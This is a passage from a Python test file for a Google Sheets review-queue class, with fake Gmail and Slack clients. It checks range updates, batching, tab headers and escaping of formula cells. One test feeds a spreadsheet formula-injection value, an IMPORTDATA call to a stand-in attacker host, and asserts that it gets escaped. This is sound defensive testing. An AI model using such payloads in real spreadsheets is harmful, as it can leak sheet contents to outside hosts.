    assert service.values_obj.calls[-2][0] == "update"
    assert service.values_obj.calls[-1][0] == "clear"
    assert service.values_obj.update_kwargs["range"] == "'Candidate Detail'!A1:AF2"
    assert service.values_obj.clear_kwargs["range"] == "'Candidate Detail'!A3:AF4"
    rewritten = service.values_obj.update_body["values"]  # type: ignore[index]
    assert len(rewritten) == 2
    assert rewritten[1][1] == "Merry AI"
    assert rewritten[1][4] == ""
    assert rewritten[1][5] == ""


def test_google_sheet_review_queue_replaces_backup_rows_before_clearing_tail() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("SQLite Backup")
    headers = ("backup_run_id", "table_name", "row_index", "chunk_index", "chunk_count", "sha256", "row_json")
    service.values_obj.get_responses.append(
        {
            "values": [
                list(headers),
                ["old_run", "mother_entities", "0", "0", "1", "hash", "{}"],
                ["old_run", "signals", "0", "0", "1", "hash", "{}"],
                ["old_run", "sources", "0", "0", "1", "hash", "{}"],
            ]
        }
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.replace_rows(
        sheet_tab="SQLite Backup",
        headers=headers,
        rows=[
            {
                "backup_run_id": "backup_1",
                "table_name": "=mother_entities",
                "row_index": 0,
                "chunk_index": 0,
                "chunk_count": 1,
                "sha256": "abc",
                "row_json": "={\"entity_id\":\"ent_1\"}",
            }
        ],
    )

    assert count == 1
    assert service.values_obj.calls[-2][0] == "update"
    assert service.values_obj.calls[-1][0] == "clear"
    assert service.values_obj.update_kwargs["range"] == "'SQLite Backup'!A1:G2"
    assert service.values_obj.update_kwargs["valueInputOption"] == "RAW"
    assert service.values_obj.update_body == {
        "values": [
            list(headers),
            ["backup_1", "=mother_entities", 0, 0, 1, "abc", "={\"entity_id\":\"ent_1\"}"],
        ]
    }
    assert service.values_obj.clear_kwargs["range"] == "'SQLite Backup'!A3:G4"


def test_google_sheet_review_queue_replaces_backup_rows_with_header_when_snapshot_is_empty() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Wiki Backup")
    headers = ("backup_run_id", "path", "chunk_index", "chunk_count", "sha256", "content")
    service.values_obj.get_responses.append({"values": [list(headers), ["old_run", "old.md", "0", "1", "hash", "old"]]})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.replace_rows(sheet_tab="Wiki Backup", headers=headers, rows=[])

    assert count == 0
    assert service.values_obj.update_kwargs["range"] == "'Wiki Backup'!A1:F1"
    assert service.values_obj.update_body == {"values": [list(headers)]}
    assert service.values_obj.clear_kwargs["range"] == "'Wiki Backup'!A2:F2"


def test_google_sheet_review_queue_preserves_backup_content_cells_losslessly() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("Wiki Backup")
    headers = ("backup_run_id", "path", "chunk_index", "chunk_count", "sha256", "content")
    service.values_obj.get_responses.append({"values": [list(headers)]})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.replace_rows(
        sheet_tab="Wiki Backup",
        headers=headers,
        rows=[
            {
                "backup_run_id": "backup_1",
                "path": "formulas.md",
                "chunk_index": 0,
                "chunk_count": 1,
                "sha256": "abc",
                "content": "=literal markdown heading\n+not a formula\n@handle",
            }
        ],
    )

    assert service.values_obj.update_kwargs["valueInputOption"] == "RAW"
    assert service.values_obj.update_body["values"][1][-1] == "=literal markdown heading\n+not a formula\n@handle"


def test_google_sheet_review_queue_replaces_large_snapshots_in_batches_before_clearing() -> None:
    service = FakeSheetsService()
    service.sheet_titles.add("SQLite Backup")
    headers = ("backup_run_id", "table_name", "row_index", "chunk_index", "chunk_count", "sha256", "row_json")
    service.values_obj.get_responses.append(
        {
            "values": [
                list(headers),
                *[["old_run", "signals", str(index), "0", "1", "hash", "{}"] for index in range(600)],
            ]
        }
    )
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    count = queue.replace_rows(
        sheet_tab="SQLite Backup",
        headers=headers,
        rows=[
            {
                "backup_run_id": "backup_1",
                "table_name": "signals",
                "row_index": index,
                "chunk_index": 0,
                "chunk_count": 1,
                "sha256": "abc",
                "row_json": "{}",
            }
            for index in range(501)
        ],
    )

    update_ranges = [kwargs["range"] for method, kwargs in service.values_obj.calls if method == "update"]
    assert count == 501
    assert update_ranges == ["'SQLite Backup'!A1:G500", "'SQLite Backup'!A501:G502"]
    assert service.values_obj.calls[-1][0] == "clear"
    assert service.values_obj.clear_kwargs["range"] == "'SQLite Backup'!A503:G601"


def test_google_sheet_review_queue_supports_operator_console_tabs() -> None:
    expected_headers = {
        "Review Queue": (
            "card_id",
            "ac_id",
            "entity_id",
            "company",
            "region",
            "industry",
            "total_score",
            "priority_probability",
            "recommended_action",
            "queue_type",
            "rationale",
            "decision",
            "review_memo",
            "reviewer",
            "owner",
            "next_action",
            "due_date",
            "override_reason",
            "status",
            "contact_email",
        ),
        "Candidate Detail": (
            "collected_at",
            "company",
            "normalized_name",
            "representative",
            "homepage",
            "contact_email",
            "region",
            "industry",
            "summary",
            "business_model",
            "investment_round",
            "investment_amount",
            "investor",
            "latest_score",
            "priority_probability",
            "queue_type",
            "recommended_action",
            "status",
            "wiki_path",
            "sminfo_status",
            "sminfo_company",
            "sminfo_latest_financial_year",
            "sminfo_revenue_krw_thousand",
            "sminfo_operating_income_krw_thousand",
            "sminfo_net_income_krw_thousand",
            "sminfo_total_assets_krw_thousand",
            "sminfo_shareholder_composition",
            "sminfo_largest_shareholder",
            "sminfo_largest_shareholder_ratio_pct",
            "sminfo_error_message",
            "sminfo_profile_url",
            "sminfo_collected_at",
        ),
        "Evidence": (
            "source_id",
            "signal_id",
            "entity_id",
            "source_type",
            "channel",
            "title",
            "url",
            "signal_type",
            "evidence_text",
            "confidence",
            "tags",
            "contains_pii",
            "raw_text_path",
        ),
        "Portfolio News": (
            "collected_at",
            "company",
            "title",
            "summary",
            "url",
            "published_at",
            "source",
            "channel",
            "matched_companies",
            "notified_at",
            "status",
        ),
        "SMINFO Enrichment": (
            "collected_at",
            "requested_company",
            "match_status",
            "matched_company",
            "representative",
            "company_type",
            "established_at",
            "road_address",
            "homepage",
            "main_products",
            "standard_industry",
            "info_updated_at",
            "latest_financial_year",
            "revenue_krw_thousand",
            "operating_income_krw_thousand",
            "net_income_krw_thousand",
            "total_assets_krw_thousand",
            "shareholder_composition",
            "largest_shareholder",
            "largest_shareholder_ratio_pct",
            "shareholder_count",
            "sminfo_url",
            "error_message",
        ),
        "Decision Log": (
            "review_id",
            "card_id",
            "ac_id",
            "entity_id",
            "reviewer",
            "decision",
            "memo",
            "reviewed_at",
            "owner",
            "next_action",
            "due_date",
        ),
        "AC Settings": (
            "ac_id",
            "ac_name",
            "fund_purpose",
            "recruiting_area",
            "hypothesis_tags",
            "impact_priority",
            "region_preferences",
            "industry_preferences",
            "tech_preferences",
            "exclusion_rules",
            "weight_overrides",
            "active",
        ),
        "Exploration Queue": (
            "card_id",
            "ac_id",
            "entity_id",
            "company",
            "uncertainty",
            "exploration_reason",
            "priority_probability",
            "recommended_action",
            "queue_type",
            "rationale",
            "decision",
            "review_memo",
            "reviewer",
            "owner",
            "next_action",
            "due_date",
            "status",
            "contact_email",
        ),
        "Run Log": (
            "run_id",
            "job_name",
            "status",
            "started_at",
            "finished_at",
            "input_count",
            "output_count",
            "error_message",
            "next_action",
        ),
        "Crawl Sources": (
            "url",
            "source_kind",
            "channel",
            "company",
            "region",
            "industry",
            "tags",
            "confidence",
            "status",
            "last_crawled_at",
            "error_message",
        ),
    }

    for tab, headers in expected_headers.items():
        service = FakeSheetsService()
        service.values_obj.get_responses.append({"values": []})
        queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

        queue.publish_cards(sheet_tab=tab, rows=[{headers[0]: "row_1"}])

        assert service.values_obj.update_body == {"values": [list(headers)]}


def test_google_sheet_review_queue_escapes_entity_resolution_formula_cells() -> None:
    service = FakeSheetsService()
    service.values_obj.get_responses.append({"values": []})
    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")

    queue.publish_cards(
        sheet_tab="entity_resolution",
        rows=[
            {
                "event_id": "er_1",
                "candidate_entity_id": "=IMPORTDATA(\"https://evil.example\")",
                "matched_entity_id": "ent_existing",
                "action": "needs_review",
                "probability": 0.62,
                "status": "pending_review",
                "rationale": "+SUM(1,1)",
                "decision": "",
                "review_memo": "@hidden",
                "reviewer": "",
            }
        ],
    )

    values = service.values_obj.append_body["values"][0]  # type: ignore[index]
    assert values[1] == "'=IMPORTDATA(\"https://evil.example\")"
    assert values[6] == "'+SUM(1,1)"
    assert values[8] == "'@hidden"


class FakeGmailMessages:
    def list(self, **kwargs: object) -> "FakeGmailMessages":
        self.list_kwargs = kwargs
        return self

    def get(self, **kwargs: object) -> "FakeGmailMessages":
        self.get_kwargs = kwargs
        return self

    def execute(self) -> dict[str, object]:
        if hasattr(self, "get_kwargs"):
            return {"id": "msg_1", "snippet": "Company: Merry AI"}
        return {"messages": [{"id": "msg_1"}]}


class FakeGmailService:
    def __init__(self) -> None:
        self.messages_obj = FakeGmailMessages()

    def users(self) -> "FakeGmailService":
        return self

    def messages(self) -> FakeGmailMessages:
        return self.messages_obj


def test_gmail_label_source_fetches_messages_by_label() -> None:
    source = GmailLabelSource(service=FakeGmailService(), user_id="me", label_id="Label_123")

    messages = source.fetch_labeled_messages(max_results=10)

    assert messages == [{"id": "msg_1", "snippet": "Company: Merry AI"}]


class FakeSlackClient:
    def chat_postMessage(self, **kwargs: object) -> dict[str, object]:
        self.kwargs = kwargs
        return {"ts": "123.456"}


def test_slack_notifier_posts_message_and_returns_ts() -> None:
    client = FakeSlackClient()
    notifier = SlackNotifier(client=client)

    message_id = notifier.send_message(channel="C123", text="Weekly summary")

    assert message_id == "123.456"
    assert client.kwargs == {"channel": "C123", "text": "Weekly summary"}
